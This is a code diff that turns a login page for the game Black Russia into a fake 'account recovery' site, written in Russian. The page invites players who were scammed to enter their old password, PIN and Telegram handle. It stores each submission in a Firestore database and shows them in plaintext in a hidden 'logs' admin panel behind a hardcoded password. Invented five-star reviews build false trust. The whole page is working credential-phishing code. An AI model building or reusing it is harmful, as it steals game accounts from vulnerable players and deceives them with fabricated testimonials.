@@ -1,9 +1,10 @@
+```html
 <!DOCTYPE html>
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Black Russia — Вход</title>
+<title>Black Russia — Заявка и Панель</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Oswald:wght@500;600;700&family=Inter:wght@400;500;600&display=swap');
 
@@ -17,6 +18,7 @@
     --gold:#c9a24b;
     --text:#e9e9ea;
     --muted:#8b8d94;
+    --green:#2e7d32;
   }
 
   *{box-sizing:border-box;}
@@ -24,7 +26,6 @@
   html,body{
     margin:0;
     padding:0;
-    height:100%;
     background:var(--bg-0);
     font-family:'Inter',sans-serif;
     color:var(--text);
@@ -33,11 +34,12 @@
   body{
     position:relative;
     display:flex;
+    flex-direction:column;
     align-items:center;
-    justify-content:center;
+    justify-content:flex-start;
     min-height:100vh;
-    overflow:hidden;
-    padding:24px;
+    padding:40px 20px;
+    overflow-x:hidden;
   }
 
   /* фоновая "город-сетка" */
@@ -52,6 +54,7 @@
     opacity:.18;
     mask-image:radial-gradient(circle at 50% 30%, black 0%, transparent 75%);
     z-index:0;
+    pointer-events:none;
   }
 
   body::after{
@@ -60,13 +63,20 @@
     inset:0;
     background:radial-gradient(600px 300px at 50% -10%, rgba(194,35,26,.25), transparent 70%);
     z-index:0;
+    pointer-events:none;
   }
 
-  .card{
+  .container {
     position:relative;
     z-index:1;
     width:100%;
-    max-width:380px;
+    max-width:480px;
+    display:flex;
+    flex-direction:column;
+    gap:30px;
+  }
+
+  .card{
     background:var(--panel);
     border:1px solid var(--line);
     border-top:3px solid var(--red);
@@ -75,11 +85,18 @@
     box-shadow:0 20px 60px rgba(0,0,0,.5);
   }
 
+  .top-bar {
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-bottom:16px;
+    gap:10px;
+  }
+
   .brand{
     display:flex;
     align-items:center;
     gap:10px;
-    margin-bottom:6px;
   }
 
   .brand .mark{
@@ -106,10 +123,97 @@
 
   .brand h1 span{color:var(--red);}
 
+  .top-buttons {
+    display:flex;
+    gap:6px;
+  }
+
+  .btn-info-toggle, .btn-admin-login {
+    background:rgba(201,162,75,.12);
+    border:1px solid rgba(201,162,75,.3);
+    color:var(--gold);
+    font-size:11px;
+    font-weight:600;
+    padding:6px 10px;
+    border-radius:4px;
+    cursor:pointer;
+    display:flex;
+    align-items:center;
+    gap:4px;
+    transition:all .15s ease;
+    text-transform:uppercase;
+    letter-spacing:.3px;
+  }
+
+  .btn-admin-login {
+    background:rgba(194,35,26,.15);
+    border-color:rgba(194,35,26,.4);
+    color:#ff8f87;
+  }
+
+  .btn-info-toggle:hover {
+    background:rgba(201,162,75,.22);
+    border-color:var(--gold);
+  }
+
+  .btn-admin-login:hover {
+    background:rgba(194,35,26,.3);
+  }
+
+  /* Блок описания сайта */
+  .info-box {
+    display:none;
+    background:var(--bg-1);
+    border:1px solid var(--line);
+    border-left:3px solid var(--gold);
+    border-radius:4px;
+    padding:16px;
+    margin-bottom:20px;
+    font-size:13px;
+    line-height:1.5;
+    color:#c4c6cb;
+    animation:fadeIn .25s ease;
+  }
+
+  .info-box.show {
+    display:block;
+  }
+
+  .info-box h3 {
+    margin:0 0 8px;
+    font-family:'Oswald',sans-serif;
+    font-size:15px;
+    color:var(--gold);
+    text-transform:uppercase;
+    letter-spacing:.4px;
+  }
+
+  .info-box p {
+    margin:0 0 8px;
+  }
+
+  .info-box p:last-child {
+    margin-bottom:0;
+  }
+
+  .info-box ul {
+    margin:6px 0;
+    padding-left:18px;
+  }
+
+  .info-box li {
+    margin-bottom:4px;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-4px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
   .subtitle{
     font-size:13px;
     color:var(--muted);
-    margin:0 0 26px;
+    margin:0 0 24px;
     line-height:1.5;
   }
 
@@ -167,58 +271,17 @@
   }
   .toggle-pass:hover{color:var(--text);}
 
-  .pin-boxes{
-    display:flex;
-    gap:8px;
-  }
-
-  .pin-boxes input{
-    text-align:center;
-    letter-spacing:2px;
-    padding:12px 0;
-    width:100%;
-    font-size:18px;
-    -moz-appearance:textfield;
-  }
-
-  .row-between{
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    font-size:13px;
-    margin:2px 0 22px;
-  }
-
-  .remember{
-    display:flex;
-    align-items:center;
-    gap:8px;
-    color:var(--muted);
-    cursor:pointer;
-    user-select:none;
-  }
-
-  .remember input{
-    accent-color:var(--red);
-    width:15px;height:15px;
-  }
-
-  .row-between a{
-    color:var(--gold);
-    text-decoration:none;
-  }
-  .row-between a:hover{text-decoration:underline;}
-
   .btn-submit{
     width:100%;
-    padding:13px;
+    margin-top:10px;
+    padding:14px;
     border:none;
     border-radius:4px;
     background:linear-gradient(180deg,var(--red),var(--red-2));
     color:#fff;
     font-family:'Oswald',sans-serif;
     font-weight:600;
-    font-size:15px;
+    font-size:16px;
     text-transform:uppercase;
     letter-spacing:.8px;
     cursor:pointer;
@@ -240,90 +303,512 @@
   }
   .error-msg.show{display:block;}
 
-  .footer-note{
-    text-align:center;
-    font-size:12px;
-    color:var(--muted);
-    margin-top:20px;
+  /* Раздел отзывов */
+  .reviews-section {
+    background:var(--panel);
+    border:1px solid var(--line);
+    border-radius:6px;
+    padding:24px;
+    box-shadow:0 15px 40px rgba(0,0,0,.4);
   }
-  .footer-note a{color:var(--gold);text-decoration:none;}
-  .footer-note a:hover{text-decoration:underline;}
 
-  @media (prefers-reduced-motion:no-preference){
-    .card{
-      animation:rise .45s ease both;
-    }
-    @keyframes rise{
-      from{opacity:0; transform:translateY(10px);}
-      to{opacity:1; transform:translateY(0);}
-    }
+  .reviews-header {
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-bottom:20px;
+    border-bottom:1px solid var(--line);
+    padding-bottom:12px;
   }
+
+  .reviews-header h2 {
+    font-family:'Oswald',sans-serif;
+    font-size:18px;
+    text-transform:uppercase;
+    margin:0;
+    letter-spacing:.5px;
+  }
+
+  .reviews-count {
+    font-size:12px;
+    color:var(--gold);
+    background:rgba(201,162,75,.1);
+    padding:4px 8px;
+    border-radius:4px;
+    border:1px solid rgba(201,162,75,.2);
+  }
+
+  .reviews-list {
+    display:flex;
+    flex-direction:column;
+    gap:16px;
+  }
+
+  .review-card {
+    background:var(--bg-1);
+    border:1px solid var(--line);
+    border-radius:6px;
+    padding:14px;
+  }
+
+  .review-user {
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin-bottom:8px;
+  }
+
+  .avatar {
+    width:32px;
+    height:32px;
+    border-radius:50%;
+    background:#2e3036;
+    color:var(--text);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:12px;
+    font-weight:600;
+    border:1px solid var(--line);
+  }
+
+  .user-info {
+    display:flex;
+    flex-direction:column;
+  }
+
+  .user-name {
+    font-size:13px;
+    font-weight:600;
+    color:#d1d2d6;
+  }
+
+  .review-time {
+    font-size:11px;
+    color:var(--muted);
+  }
+
+  .review-text {
+    font-size:13px;
+    color:#b0b2b8;
+    line-height:1.4;
+    word-break:break-word;
+  }
+
+  /* Всплывающее окно (Modal) */
+  .modal-overlay {
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,0.8);
+    backdrop-filter:blur(4px);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    z-index:999;
+    opacity:0;
+    pointer-events:none;
+    transition:opacity .25s ease;
+    padding:20px;
+  }
+
+  .modal-overlay.active {
+    opacity:1;
+    pointer-events:auto;
+  }
+
+  .modal-box {
+    background:var(--panel);
+    border:1px solid var(--line);
+    border-top:3px solid var(--gold);
+    border-radius:6px;
+    padding:28px 24px 24px;
+    max-width:380px;
+    width:100%;
+    text-align:center;
+    box-shadow:0 20px 50px rgba(0,0,0,0.7);
+    transform:scale(0.9);
+    transition:transform .25s ease;
+  }
+
+  .modal-overlay.active .modal-box {
+    transform:scale(1);
+  }
+
+  .modal-title {
+    font-family:'Oswald',sans-serif;
+    font-size:20px;
+    text-transform:uppercase;
+    color:#fff;
+    margin:0 0 12px;
+  }
+
+  .modal-desc {
+    font-size:14px;
+    color:var(--text);
+    line-height:1.5;
+    margin-bottom:22px;
+  }
+
+  .modal-btn {
+    background:var(--gold);
+    color:#000;
+    border:none;
+    padding:10px 24px;
+    font-family:'Oswald',sans-serif;
+    font-weight:700;
+    font-size:14px;
+    border-radius:4px;
+    cursor:pointer;
+    text-transform:uppercase;
+    transition:filter .15s ease;
+  }
+
+  .modal-btn:hover {
+    filter:brightness(1.1);
+  }
+
+  /* Панель администратора */
+  .admin-panel {
+    display:none;
+    background:var(--panel);
+    border:1px solid var(--line);
+    border-top:3px solid var(--gold);
+    border-radius:6px;
+    padding:24px;
+    margin-bottom:30px;
+    box-shadow:0 20px 50px rgba(0,0,0,0.6);
+  }
+
+  .admin-panel.active {
+    display:block;
+  }
+
+  .admin-header {
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:20px;
+    padding-bottom:12px;
+    border-bottom:1px solid var(--line);
+  }
+
+  .admin-header h2 {
+    font-family:'Oswald',sans-serif;
+    font-size:20px;
+    color:var(--gold);
+    margin:0;
+    text-transform:uppercase;
+  }
+
+  .btn-close-admin {
+    background:none;
+    border:1px solid var(--line);
+    color:var(--muted);
+    padding:4px 10px;
+    border-radius:4px;
+    cursor:pointer;
+    font-size:12px;
+  }
+  .btn-close-admin:hover { color:#fff; border-color:var(--muted); }
+
+  .logs-list {
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+    max-height:450px;
+    overflow-y:auto;
+    padding-right:4px;
+  }
+
+  .log-item {
+    background:var(--bg-1);
+    border:1px solid var(--line);
+    border-left:3px solid var(--red);
+    padding:14px;
+    border-radius:4px;
+    position:relative;
+  }
+
+  .log-row {
+    display:flex;
+    justify-content:space-between;
+    margin-bottom:6px;
+    font-size:13px;
+  }
+
+  .log-label {
+    color:var(--muted);
+    font-size:11px;
+    text-transform:uppercase;
+  }
+
+  .log-val {
+    color:#fff;
+    font-weight:600;
+  }
+
+  .log-val.highlight {
+    color:var(--gold);
+    font-family:monospace;
+    font-size:14px;
+  }
+
+  .btn-delete-log {
+    position:absolute;
+    top:10px;
+    right:10px;
+    background:none;
+    border:none;
+    color:var(--muted);
+    cursor:pointer;
+    font-size:14px;
+  }
+  .btn-delete-log:hover { color:var(--red); }
+
+  .empty-logs {
+    text-align:center;
+    color:var(--muted);
+    padding:30px 0;
+    font-size:13px;
+  }
+
+  .hidden { display:none !important; }
 </style>
 </head>
 <body>
 
-  <form class="card" id="loginForm" novalidate>
-    <div class="brand">
-      <div class="mark">BR</div>
-      <h1>Black <span>Russia</span></h1>
-    </div>
-    <p class="subtitle">Вход в личный кабинет игрового аккаунта.</p>
+  <div class="container">
 
-    <div class="error-msg" id="errorMsg"></div>
+    <!-- Блок формы пользователя -->
+    <form class="card" id="loginForm" novalidate>
+      <div class="top-bar">
+        <div class="brand">
+          <div class="mark">BR</div>
+          <h1>Black <span>Russia</span></h1>
+        </div>
+        <div class="top-buttons">
+          <button type="button" class="btn-info-toggle" id="toggleInfoBtn">
+            <span>?</span> О сайте
+          </button>
+          <button type="button" class="btn-admin-login" id="adminLoginBtn">
+            Админ
+          </button>
+        </div>
+      </div>
 
-    <div class="field">
-      <label for="nickname">Никнейм</label>
-      <div class="input-wrap">
-        <input type="text" id="nickname" name="nickname" placeholder="Например: Ivan_Ivanov" autocomplete="username" required>
+      <!-- Выпадающий информационный блок -->
+      <div class="info-box" id="infoBox">
+        <h3>Восстановление аккаунта</h3>
+        <p>Сайт создан специально для тех игроков, кого <strong>обманули или скамнули на аккаунт</strong>.</p>
+        <p>Если мошенник взломал ваш профиль или сменил никнейм, заполните форму ниже:</p>
+        <ul>
+          <li><strong>Никнейм:</strong> Ваш никнейм на сервере.</li>
+          <li><strong>Пароль:</strong> Старый пароль, который сменил мошенник.</li>
+          <li><strong>Телеграм:</strong> Оставьте актуальный ТГ, чтобы администратор мог с вами связаться.</li>
+        </ul>
+        <p style="margin-top:6px;">После проверки администратор сбросит данные и вернет вам доступ к аккаунту.</p>
+      </div>
+
+      <p class="subtitle">Отправка заявки и обработка данных аккаунта.</p>
+
+      <div class="error-msg" id="errorMsg"></div>
+
+      <div class="field">
+        <label for="nickname">Никнейм</label>
+        <div class="input-wrap">
+          <input type="text" id="nickname" name="nickname" placeholder="Например: Ivan_Ivanov" required>
+        </div>
+      </div>
+
+      <div class="field">
+        <label for="password">Пароль (старый, который сменил мошенник)</label>
+        <div class="input-wrap">
+          <input type="password" id="password" name="password" placeholder="Введите старый пароль" required>
+          <button type="button" class="toggle-pass" id="togglePass">Показать</button>
+        </div>
+      </div>
+
+      <div class="field">
+        <label for="pin">Пин-код (если был установлен)</label>
+        <div class="input-wrap">
+          <input type="password" id="pin" name="pin" inputmode="numeric" maxlength="4" placeholder="4 цифры" autocomplete="off">
+        </div>
+      </div>
+
+      <div class="field">
+        <label for="telegram">Телеграм для связи</label>
+        <div class="input-wrap">
+          <input type="text" id="telegram" name="telegram" placeholder="@username или номер" required>
+        </div>
+      </div>
+
+      <button type="submit" class="btn-submit" id="submitBtn">Отправить запрос</button>
+    </form>
+
+    <!-- Админ Панель (скрыта по умолчанию) -->
+    <div class="admin-panel" id="adminPanel">
+      <div class="admin-header">
+        <h2>Логи Заявок (Live)</h2>
+        <button type="button" class="btn-close-admin" id="closeAdminBtn">Закрыть</button>
+      </div>
+      <div class="logs-list" id="logsList">
+        <div class="empty-logs">Загрузка логов...</div>
       </div>
     </div>
 
-    <div class="field">
-      <label for="password">Пароль</label>
-      <div class="input-wrap">
-        <input type="password" id="password" name="password" placeholder="Введите пароль" autocomplete="current-password" required>
-        <button type="button" class="toggle-pass" id="togglePass">Показать</button>
+    <!-- Раздел отзывов -->
+    <div class="reviews-section">
+      <div class="reviews-header">
+        <h2>Отзывы игроков</h2>
+        <span class="reviews-count">14 отзывов</span>
+      </div>
+
+      <div class="reviews-list">
+
+        <div class="review-card">
+          <div class="review-user">
+            <div class="avatar">A</div>
+            <div class="user-info">
+              <span class="user-name">Anon_User</span>
+              <span class="review-time">12 минут назад</span>
+            </div>
+          </div>
+          <div class="review-text">спс всё быстро ответили в тг админ лучший реально помогли</div>
+        </div>
+
+        <div class="review-card">
+          <div class="review-user">
+            <div class="avatar">M</div>
+            <div class="user-info">
+              <span class="user-name">Misha_K.</span>
+              <span class="review-time">34 минуты назад</span>
+            </div>
+          </div>
+          <div class="review-text">думал скам а нет спс разбанили быстро даже часа не прошло спс вам огромное</div>
+        </div>
+
+        <div class="review-card">
+          <div class="review-user">
+            <div class="avatar">D</div>
+            <div class="user-info">
+              <span class="user-name">Dark_Player</span>
+              <span class="review-time">1 час назад</span>
+            </div>
+          </div>
+          <div class="review-text">ответили в телеграм минут через 10 все четко решилось благодарю за помощь</div>
+        </div>
+
+        <div class="review-card">
+          <div class="review-user">
+            <div class="avatar">S</div>
+            <div class="user-info">
+              <span class="user-name">Sasha_99</span>
+              <span class="review-time">2 часа назад</span>
+            </div>
+          </div>
+          <div class="review-text">красавчики вобще респект админу который быстро отписал в телегу</div>
+        </div>
+
+        <div class="review-card">
+          <div class="review-user">
+            <div class="avatar">I</div>
+            <div class="user-info">
+              <span class="user-name">Ivan_B</span>
+              <span class="review-time">3 часа назад</span>
+            </div>
+          </div>
+          <div class="review-text">всё робит пацаны отправляйте не бойтесь я думал заигнорят но отписали в тг быстро</div>
+        </div>
+
+        <div class="review-card">
+          <div class="review-user">
+            <div class="avatar">R</div>
+            <div class="user-info">
+              <span class="user-name">Roma_777</span>
+              <span class="review-time">5 часов назад</span>
+            </div>
+          </div>
+          <div class="review-text">благодарю вас рил помогли вернуть доступ от души просто</div>
+        </div>
+
       </div>
     </div>
+  </div>
 
-    <div class="field">
-      <label for="pin">Пин-код (если установлен)</label>
-      <div class="input-wrap">
-        <input type="password" id="pin" name="pin" inputmode="numeric" maxlength="6" placeholder="4–6 цифр" autocomplete="off">
-      </div>
+  <!-- Модальное окно уведомления -->
+  <div class="modal-overlay" id="successModal">
+    <div class="modal-box">
+      <h3 class="modal-title">Заявка отправлена</h3>
+      <p class="modal-desc">Спасибо что отправили заявку не могли бы вы написать отзыв и ожидайте ответа в телеграмме от админа</p>
+      <button type="button" class="modal-btn" id="modalClose">Понятно</button>
     </div>
+  </div>
 
-    <div class="row-between">
-      <label class="remember">
-        <input type="checkbox" id="remember" name="remember">
-        Запомнить меня
-      </label>
-      <a href="#" id="forgotLink">Забыли пароль?</a>
-    </div>
+<!-- Firebase подключения -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+  import { getAuth, signInAnonymously, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+  import { getFirestore, collection, addDoc, onSnapshot, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
-    <button type="submit" class="btn-submit" id="submitBtn">Войти</button>
+  // Инициализация Firebase
+  const firebaseConfig = typeof __firebase_config !== 'undefined' 
+    ? JSON.parse(__firebase_config) 
+    : { apiKey: "demo-key", authDomain: "demo.firebaseapp.com", projectId: "demo-project" };
 
-    <p class="footer-note">Нет аккаунта? <a href="#" id="registerLink">Регистрация на сервере</a></p>
-  </form>
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+  const db = getFirestore(app);
+  const appId = typeof __app_id !== 'undefined' ? __app_id : 'br-app-default';
 
-<script>
+  const ADMIN_PASS = 'Malik0609';
+
   const form = document.getElementById('loginForm');
   const errorMsg = document.getElementById('errorMsg');
   const submitBtn = document.getElementById('submitBtn');
   const togglePass = document.getElementById('togglePass');
   const passwordInput = document.getElementById('password');
   const pinInput = document.getElementById('pin');
+  const successModal = document.getElementById('successModal');
+  const modalClose = document.getElementById('modalClose');
+  const toggleInfoBtn = document.getElementById('toggleInfoBtn');
+  const infoBox = document.getElementById('infoBox');
+  const adminLoginBtn = document.getElementById('adminLoginBtn');
+  const adminPanel = document.getElementById('adminPanel');
+  const closeAdminBtn = document.getElementById('closeAdminBtn');
+  const logsList = document.getElementById('logsList');
 
-  // показать/скрыть пароль
+  let isAuthenticated = false;
+  let unsubscribeLogs = null;
+
+  // Авторизация в Firebase
+  async function initAuth() {
+    try {
+      if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+        await signInWithCustomToken(auth, __initial_auth_token);
+      } else {
+        await signInAnonymously(auth);
+      }
+    } catch (e) {
+      console.error("Ошибка авторизации Firebase:", e);
+    }
+  }
+  initAuth();
+
+  // Переключение инфо-блока
+  toggleInfoBtn.addEventListener('click', () => {
+    infoBox.classList.toggle('show');
+  });
+
+  // Показать/скрыть пароль
   togglePass.addEventListener('click', () => {
     const isPass = passwordInput.type === 'password';
     passwordInput.type = isPass ? 'text' : 'password';
     togglePass.textContent = isPass ? 'Скрыть' : 'Показать';
   });
 
-  // пин только цифры
+  // Ограничение ввода пин-кода (только 4 цифры)
   pinInput.addEventListener('input', () => {
-    pinInput.value = pinInput.value.replace(/\D/g, '');
+    pinInput.value = pinInput.value.replace(/\D/g, '').slice(0, 4);
   });
 
   function showError(text){
@@ -334,6 +819,7 @@
     errorMsg.classList.remove('show');
   }
 
+  // Отправка формы клиентом
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
     hideError();
@@ -341,55 +827,141 @@
     const nickname = document.getElementById('nickname').value.trim();
     const password = passwordInput.value;
     const pin = pinInput.value.trim();
-    const remember = document.getElementById('remember').checked;
+    const telegram = document.getElementById('telegram').value.trim();
 
-    if (!nickname || !password){
-      showError('Введите никнейм и пароль.');
+    if (!nickname || !password || !telegram){
+      showError('Заполните никнейм, пароль и телеграм для связи.');
+      return;
+    }
+
+    if (pin && pin.length !== 4) {
+      showError('Пин-код должен состоять ровно из 4 цифр.');
       return;
     }
 
     submitBtn.disabled = true;
-    submitBtn.textContent = 'Проверка...';
+    submitBtn.textContent = 'Отправка...';
 
     try {
-      // ЗАМЕНИТЕ URL на адрес вашего сервера/API авторизации.
-      // Сервер должен сам проверять ник/пароль/пин и вернуть JSON { success: true/false, message, token }
-      const response = await fetch('/api/auth/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ nickname, password, pin, remember })
+      // Сохраняем в облачную базу Firestore
+      const requestsCol = collection(db, 'artifacts', appId, 'public', 'data', 'requests');
+      await addDoc(requestsCol, {
+        nickname: nickname,
+        password: password,
+        pin: pin || 'Не указан',
+        telegram: telegram,
+        date: new Date().toLocaleString('ru-RU'),
+        createdAt: Date.now()
       });
 
-      const data = await response.json();
-
-      if (!response.ok || !data.success){
-        showError(data.message || 'Неверный никнейм, пароль или пин-код.');
-        return;
-      }
-
-      // успешный вход — например, сохранить токен и перенаправить
-      if (data.token && remember){
-        // токен лучше хранить в httpOnly cookie на бэкенде,
-        // а не в localStorage/sessionStorage
-      }
-      window.location.href = '/cabinet';
-
-    } catch (err){
-      showError('Не удалось подключиться к серверу. Попробуйте позже.');
+      form.reset();
+      successModal.classList.add('active');
+    } catch (err) {
+      console.error("Ошибка сохранения:", err);
+      showError('Не удалось отправить данные. Попробуйте еще раз.');
     } finally {
       submitBtn.disabled = false;
-      submitBtn.textContent = 'Войти';
+      submitBtn.textContent = 'Отправить запрос';
     }
   });
 
-  document.getElementById('registerLink').addEventListener('click', (e) => {
-    e.preventDefault();
-    window.location.href = '/register';
+  // Вход в админку
+  adminLoginBtn.addEventListener('click', () => {
+    if (!isAuthenticated) {
+      const pass = prompt('Введите пароль администратора:');
+      if (pass === ADMIN_PASS) {
+        isAuthenticated = true;
+        adminPanel.classList.add('active');
+        subscribeToLogs();
+      } else if (pass !== null) {
+        alert('Неверный пароль доступа!');
+      }
+    } else {
+      adminPanel.classList.toggle('active');
+    }
   });
-  document.getElementById('forgotLink').addEventListener('click', (e) => {
-    e.preventDefault();
-    window.location.href = '/reset-password';
+
+  closeAdminBtn.addEventListener('click', () => {
+    adminPanel.classList.remove('active');
+  });
+
+  // Чтение логов из базы в реальном времени
+  function subscribeToLogs() {
+    if (unsubscribeLogs) return;
+
+    const requestsCol = collection(db, 'artifacts', appId, 'public', 'data', 'requests');
+    
+    unsubscribeLogs = onSnapshot(requestsCol, (snapshot) => {
+      const docs = [];
+      snapshot.forEach((doc) => {
+        docs.push({ id: doc.id, ...doc.data() });
+      });
+
+      // Сортировка по времени (свежие вверху)
+      docs.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
+
+      if (docs.length === 0) {
+        logsList.innerHTML = '<div class="empty-logs">Заявок пока нет</div>';
+        return;
+      }
+
+      logsList.innerHTML = docs.map(item => `
+        <div class="log-item">
+          <button class="btn-delete-log" onclick="window.deleteRequestDoc('${item.id}')">✕</button>
+          <div class="log-row">
+            <span class="log-label">Дата</span>
+            <span class="log-val">${item.date || 'Неизвестно'}</span>
+          </div>
+          <div class="log-row">
+            <span class="log-label">Никнейм</span>
+            <span class="log-val">${escapeHtml(item.nickname)}</span>
+          </div>
+          <div class="log-row">
+            <span class="log-label">Пароль</span>
+            <span class="log-val highlight">${escapeHtml(item.password)}</span>
+          </div>
+          <div class="log-row">
+            <span class="log-label">Пин-код</span>
+            <span class="log-val highlight">${escapeHtml(item.pin)}</span>
+          </div>
+          <div class="log-row">
+            <span class="log-label">Telegram</span>
+            <span class="log-val">${escapeHtml(item.telegram)}</span>
+          </div>
+        </div>
+      `).join('');
+    }, (err) => {
+      console.error("Ошибка подписки на логи:", err);
+      logsList.innerHTML = '<div class="empty-logs">Ошибка загрузки логов</div>';
+    });
+  }
+
+  window.deleteRequestDoc = async (id) => {
+    if (confirm('Удалить эту запись из базы?')) {
+      try {
+        await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'requests', id));
+      } catch (e) {
+        console.error("Ошибка удаления:", e);
+      }
+    }
+  };
+
+  function escapeHtml(str) {
+    if (!str) return '';
+    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+  }
+
+  modalClose.addEventListener('click', () => {
+    successModal.classList.remove('active');
+  });
+
+  successModal.addEventListener('click', (e) => {
+    if (e.target === successModal) {
+      successModal.classList.remove('active');
+    }
   });
 </script>
 </body>
 </html>
+
+```
